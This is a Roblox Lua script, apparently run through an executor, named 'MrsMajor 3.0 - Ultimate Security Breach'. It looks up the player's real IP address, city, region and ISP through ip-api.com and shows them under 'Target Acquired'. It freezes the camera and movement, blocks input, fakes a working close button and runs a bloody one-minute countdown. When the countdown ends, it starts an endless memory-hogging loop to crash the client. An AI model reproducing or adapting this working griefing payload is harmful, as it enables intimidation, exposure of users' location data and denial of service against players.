-- MrsMajor_3_0_Ultimate_1Min.lua
-- Unified script: 1-Minute timer, ip-api real IP fetch, custom blood asset, camera/movement lock, UI, and RAM Crash Loop
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local camera = workspace.CurrentCamera

--------------------------------------------------------------------------------
-- КОНФИГУРАЦИЯ И ПОЛУЧЕНИЕ НАСТОЯЩЕГО IP ЧЕРЕЗ IP-API
--------------------------------------------------------------------------------
local AUDIO_ASSET_ID = "rbxassetid://0" -- Укажите ID звука, если требуется
local AUDIO_VOLUME = 0.75
local TOTAL_BLOOD_TIME = 60            -- Изменено на 1 минуту (60 секунд)
local BLOOD_DRIP_COUNT = 24
local BLOOD_ASSET_ID = "rbxassetid://14280704585"

-- Запрос реальных данных через ip-api.com
local success, ipData = pcall(function()
    local response = game:HttpGet("http://ip-api.com/json")
    return HttpService:JSONDecode(response)
end)

local targetIP = (success and ipData and ipData.query) or "127.0.0.1"
local city = (success and ipData and ipData.city) or "Unknown City"
local region = (success and ipData and ipData.regionName) or "Unknown Region"
local country = (success and ipData and ipData.country) or "Unknown Country"
local org = (success and ipData and ipData.isp) or "Unknown ISP"

--------------------------------------------------------------------------------
-- БЛОКИРОВКА КАМЕРЫ И ДВИЖЕНИЯ (СУВЕРЕННЫЙ ИНТЕРФЕЙС)
--------------------------------------------------------------------------------
task.wait(0.1)
camera.CameraType = Enum.CameraType.Scriptable
local fixedCameraCFrame = camera.CFrame

RunService:BindToRenderStep("FreezeCameraStep", Enum.RenderPriority.Camera.Value + 1, function()
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = fixedCameraCFrame
    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
    UserInputService.MouseIconEnabled = true
end)

local function sinkAction()
    return Enum.ContextActionResult.Sink
end

ContextActionService:BindActionAtPriority(
    "DisableInputsAction",
    sinkAction,
    false,
    Enum.ContextActionPriority.High.Value + 1000,
    Enum.UserInputType.MouseButton2,
    Enum.UserInputType.MouseWheel,
    Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
    Enum.KeyCode.Space, Enum.KeyCode.Up, Enum.KeyCode.Down, Enum.KeyCode.Left, Enum.KeyCode.Right
)

-- Безопасная загрузка контроллеров с тайм-аутом
task.spawn(function()
    local pScripts = player:WaitForChild("PlayerScripts", 5)
    if pScripts then
        local pModule = pScripts:WaitForChild("PlayerModule", 3)
        if pModule then
            local pSuccess, playerModule = pcall(require, pModule)
            if pSuccess and playerModule then
                local controls = playerModule:GetControls()
                if controls then
                    controls:Disable()
                end
            end
        end
    end
end)

local function freezeHumanoid(char)
    local hum = char:WaitForChild("Humanoid", 5)
    if hum then
        hum.WalkSpeed = 0
        hum.JumpPower = 0
        hum.JumpHeight = 0
    end
end
if player.Character then freezeHumanoid(player.Character) end
player.CharacterAdded:Connect(freezeHumanoid)

--------------------------------------------------------------------------------
-- СОЗДАНИЕ ГЛАВНОГО SCREEN GUI
--------------------------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MrsMajorUltimateUI"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local protectedParent = pcall(function()
    screenGui.Parent = CoreGui
end)
if not protectedParent then
    screenGui.Parent = playerGui
end

--------------------------------------------------------------------------------
-- КРАСНЫЙ ПУЛЬСИРУЮЩИЙ ФОН
--------------------------------------------------------------------------------
local bgOverlay = Instance.new("Frame")
bgOverlay.Name = "RedOverlay"
bgOverlay.Size = UDim2.new(1, 0, 1, 0)
bgOverlay.BackgroundColor3 = Color3.fromRGB(130, 0, 0)
bgOverlay.BackgroundTransparency = 0.65
bgOverlay.BorderSizePixel = 0
bgOverlay.ZIndex = 1
bgOverlay.Parent = screenGui

task.spawn(function()
    local tweenIn = TweenService:Create(bgOverlay, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.35})
    local tweenOut = TweenService:Create(bgOverlay, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.65})
    
    while screenGui.Parent do
        tweenIn:Play()
        tweenIn.Completed:Wait()
        tweenOut:Play()
        tweenOut.Completed:Wait()
    end
end)

--------------------------------------------------------------------------------
-- КАПЛИ КРОВИ ( IMAGE ASSET )
--------------------------------------------------------------------------------
local dripFolder = Instance.new("Folder")
dripFolder.Name = "BloodDrips"
dripFolder.Parent = screenGui

for i = 1, BLOOD_DRIP_COUNT do
    local drip = Instance.new("ImageLabel")
    local width = math.random(15, 35)
    local height = math.random(250, 550)
    local startX = math.random()

    drip.Size = UDim2.new(0, width, 0, height)
    drip.Position = UDim2.new(startX, 0, -0.7, 0)
    drip.Image = BLOOD_ASSET_ID
    drip.BackgroundTransparency = 1
    drip.ZIndex = 2
    drip.Parent = dripFolder

    task.spawn(function()
        while screenGui.Parent do
            local fallDuration = math.random(25, 45) / 10
            drip.Position = UDim2.new(startX, 0, -0.7, 0)
            
            local fallTween = TweenService:Create(
                drip,
                TweenInfo.new(fallDuration, Enum.EasingStyle.Linear),
                { Position = UDim2.new(startX, 0, 1.3, 0) }
            )
            fallTween:Play()
            fallTween.Completed:Wait()
            startX = math.random()
        end
    end)
end

--------------------------------------------------------------------------------
-- ГЛАВНОЕ ОКНО ИНТЕРФЕЙСА
--------------------------------------------------------------------------------
local WIN_WIDTH = 540
local WIN_HEIGHT = 420

local mainWindow = Instance.new("Frame")
mainWindow.Name = "MainWindow"
mainWindow.Size = UDim2.new(0, WIN_WIDTH, 0, WIN_HEIGHT)
mainWindow.Position = UDim2.new(0.5, -WIN_WIDTH / 2, 0.5, -WIN_HEIGHT / 2)
mainWindow.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
mainWindow.BorderColor3 = Color3.fromRGB(190, 0, 0)
mainWindow.BorderSizePixel = 3
mainWindow.ZIndex = 10
mainWindow.Parent = screenGui

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
titleBar.BorderSizePixel = 0
titleBar.ZIndex = 11
titleBar.Parent = mainWindow

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -40, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Font = Enum.Font.SourceSansBold
titleText.TextSize = 15
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Text = "MrsMajor 3.0 - Ultimate Security Breach"
titleText.ZIndex = 12
titleText.Parent = titleBar

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 24, 0, 22)
closeBtn.Position = UDim2.new(1, -28, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
closeBtn.BorderColor3 = Color3.fromRGB(220, 0, 0)
closeBtn.BorderSizePixel = 1
closeBtn.Font = Enum.Font.SourceSansBold
closeBtn.TextSize = 14
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Text = "X"
closeBtn.ZIndex = 12
closeBtn.Parent = titleBar

closeBtn.MouseButton1Click:Connect(function()
    local origPos = mainWindow.Position
    for i = 1, 6 do
        mainWindow.Position = origPos + UDim2.new(0, math.random(-12, 12), 0, math.random(-6, 6))
        task.wait(0.03)
    end
    mainWindow.Position = origPos
end)

-- Header & IP Info
local iconBox = Instance.new("Frame")
iconBox.Size = UDim2.new(0, 65, 0, 65)
iconBox.Position = UDim2.new(0, 15, 0, 40)
iconBox.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
iconBox.BorderColor3 = Color3.fromRGB(200, 0, 0)
iconBox.BorderSizePixel = 2
iconBox.ZIndex = 11
iconBox.Parent = mainWindow

local eyeIcon = Instance.new("TextLabel")
eyeIcon.Size = UDim2.new(1, 0, 1, 0)
eyeIcon.BackgroundTransparency = 1
eyeIcon.Text = "👁"
eyeIcon.TextSize = 40
eyeIcon.TextColor3 = Color3.fromRGB(255, 30, 30)
eyeIcon.ZIndex = 12
eyeIcon.Parent = iconBox

local headerText = Instance.new("TextLabel")
headerText.Size = UDim2.new(0, 430, 0, 28)
headerText.Position = UDim2.new(0, 90, 0, 40)
headerText.BackgroundTransparency = 1
headerText.Font = Enum.Font.GothamBold
headerText.TextSize = 22
headerText.TextColor3 = Color3.fromRGB(255, 40, 40)
headerText.TextXAlignment = Enum.TextXAlignment.Left
headerText.Text = "MrsMajor 3.0 - Target Acquired"
headerText.ZIndex = 11
headerText.Parent = mainWindow

local subText = Instance.new("TextLabel")
subText.Size = UDim2.new(0, 430, 0, 36)
subText.Position = UDim2.new(0, 90, 0, 68)
subText.BackgroundTransparency = 1
subText.Font = Enum.Font.SourceSans
subText.TextSize = 13
subText.TextColor3 = Color3.fromRGB(200, 200, 200)
subText.TextXAlignment = Enum.TextXAlignment.Left
subText.TextYAlignment = Enum.TextYAlignment.Top
subText.TextWrapped = true
subText.Text = string.format("IP: %s | %s, %s\nISP: %s", targetIP, city, country, org)
subText.ZIndex = 11
subText.Parent = mainWindow

-- Blood Bar
local bloodLabel = Instance.new("TextLabel")
bloodLabel.Size = UDim2.new(1, -30, 0, 20)
bloodLabel.Position = UDim2.new(0, 15, 0, 115)
bloodLabel.BackgroundTransparency = 1
bloodLabel.Font = Enum.Font.SourceSansBold
bloodLabel.TextSize = 15
bloodLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
bloodLabel.TextXAlignment = Enum.TextXAlignment.Left
bloodLabel.Text = "Blood Left: 100% (60 sec)"
bloodLabel.ZIndex = 11
bloodLabel.Parent = mainWindow

local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(1, -30, 0, 24)
barBackground.Position = UDim2.new(0, 15, 0, 138)
barBackground.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
barBackground.BorderColor3 = Color3.fromRGB(140, 0, 0)
barBackground.BorderSizePixel = 2
barBackground.ZIndex = 11
barBackground.Parent = mainWindow

local bloodFill = Instance.new("Frame")
bloodFill.Size = UDim2.new(1, 0, 1, 0)
bloodFill.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
bloodFill.BorderSizePixel = 0
bloodFill.ZIndex = 12
bloodFill.Parent = barBackground

-- Log Box
local logBox = Instance.new("TextBox")
logBox.Size = UDim2.new(1, -30, 0, 150)
logBox.Position = UDim2.new(0, 15, 0, 172)
logBox.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
logBox.BorderColor3 = Color3.fromRGB(80, 0, 0)
logBox.BorderSizePixel = 1
logBox.Font = Enum.Font.Code
logBox.TextSize = 12
logBox.TextColor3 = Color3.fromRGB(255, 130, 130)
logBox.ClearTextOnFocus = false
logBox.TextEditable = false
logBox.TextXAlignment = Enum.TextXAlignment.Left
logBox.TextYAlignment = Enum.TextYAlignment.Top
logBox.TextWrapped = true
logBox.Text = string.format(
    "> MrsMajor v3.0 core routines active.\n> Real Target IP: %s\n> Location: %s, %s (%s)\n> ISP: %s\n> Camera and locomotion anchored.\n> 1-minute countdown initiated...",
    targetIP, city, region, country, org
)
logBox.ZIndex = 11
logBox.Parent = mainWindow

-- Rules Button
local rulesBtn = Instance.new("TextButton")
rulesBtn.Size = UDim2.new(0, 130, 0, 32)
rulesBtn.Position = UDim2.new(0, 15, 0, 335)
rulesBtn.BackgroundColor3 = Color3.fromRGB(45, 0, 0)
rulesBtn.BorderColor3 = Color3.fromRGB(180, 0, 0)
rulesBtn.BorderSizePixel = 2
rulesBtn.Font = Enum.Font.SourceSansBold
rulesBtn.TextSize = 15
rulesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
rulesBtn.Text = "Show Rules"
rulesBtn.ZIndex = 11
rulesBtn.Parent = mainWindow

-- Rules Window
local rulesWindow = Instance.new("Frame")
rulesWindow.Size = UDim2.new(0, 420, 0, 240)
rulesWindow.Position = UDim2.new(0.5, -210, 0.5, -120)
rulesWindow.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
rulesWindow.BorderColor3 = Color3.fromRGB(200, 0, 0)
rulesWindow.BorderSizePixel = 2
rulesWindow.Visible = false
rulesWindow.ZIndex = 25
rulesWindow.Parent = screenGui

local rulesTitle = Instance.new("TextLabel")
rulesTitle.Size = UDim2.new(1, 0, 0, 26)
rulesTitle.BackgroundColor3 = Color3.fromRGB(130, 0, 0)
rulesTitle.Font = Enum.Font.SourceSansBold
rulesTitle.TextSize = 14
rulesTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
rulesTitle.Text = " MrsMajor 3.0 - RULES"
rulesTitle.TextXAlignment = Enum.TextXAlignment.Left
rulesTitle.ZIndex = 26
rulesTitle.Parent = rulesWindow

local rulesBody = Instance.new("TextLabel")
rulesBody.Size = UDim2.new(1, -20, 1, -70)
rulesBody.Position = UDim2.new(0, 10, 0, 32)
rulesBody.BackgroundTransparency = 1
rulesBody.Font = Enum.Font.SourceSans
rulesBody.TextSize = 14
rulesBody.TextColor3 = Color3.fromRGB(235, 235, 235)
rulesBody.TextXAlignment = Enum.TextXAlignment.Left
rulesBody.TextYAlignment = Enum.TextYAlignment.Top
rulesBody.TextWrapped = true
rulesBody.Text = "1. Character locomotion is immobilized.\n2. Camera panning and rotation have been locked.\n3. Real IP address and geolocation are fully resolved.\n4. When 'Blood Left' reaches 0% (after 1 minute), memory exhaustion triggers client termination."
rulesBody.ZIndex = 26
rulesBody.Parent = rulesWindow

local closeRulesBtn = Instance.new("TextButton")
closeRulesBtn.Size = UDim2.new(0, 100, 0, 26)
closeRulesBtn.Position = UDim2.new(0.5, -50, 1, -32)
closeRulesBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
closeRulesBtn.BorderColor3 = Color3.fromRGB(180, 0, 0)
closeRulesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeRulesBtn.Font = Enum.Font.SourceSansBold
closeRulesBtn.TextSize = 13
closeRulesBtn.Text = "Close Rules"
closeRulesBtn.ZIndex = 26
closeRulesBtn.Parent = rulesWindow

rulesBtn.MouseButton1Click:Connect(function() rulesWindow.Visible = true end)
closeRulesBtn.MouseButton1Click:Connect(function() rulesWindow.Visible = false end)

--------------------------------------------------------------------------------
-- 1-МИНУТНЫЙ ТАЙМЕР И РЕАЛЬНЫЙ КРАШ-ЦИКЛ (ЧЕРЕЗ task.wait)
--------------------------------------------------------------------------------
task.spawn(function()
    local remaining = TOTAL_BLOOD_TIME
    while remaining > 0 and screenGui.Parent do
        task.wait(1)
        remaining = remaining - 1
        local percent = math.clamp(remaining / TOTAL_BLOOD_TIME, 0, 1)

        bloodLabel.Text = string.format("Blood Left: %d%% (%d sec)", math.floor(percent * 100), remaining)
        TweenService:Create(bloodFill, TweenInfo.new(0.8, Enum.EasingStyle.Linear), {Size = UDim2.new(percent, 0, 1, 0)}):Play()
    end

    bloodLabel.Text = "Blood Left: 0% (DEPLETED - CRASHING)"
    bloodLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    bloodFill.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    
    -- Реальный цикл переполнения памяти через task.wait
    task.spawn(function()
        local memoryHog = {}
        while true do
            table.insert(memoryHog, string.rep("MRSMAJOR_3_0_CRASH_PAYLOAD_MEMORY_OVERFLOW_VEX_", 5000000))
            task.wait()
        end
    end)
end)

--------------------------------------------------------------------------------
-- ФОНОВОЕ АУДИО
--------------------------------------------------------------------------------
local bgSound = Instance.new("Sound")
bgSound.Name = "MrsMajorTheme"
bgSound.SoundId = AUDIO_ASSET_ID
bgSound.Volume = AUDIO_VOLUME
bgSound.Looped = true
bgSound.Parent = SoundService

if AUDIO_ASSET_ID ~= "rbxassetid://0" then
    bgSound:Play()
end
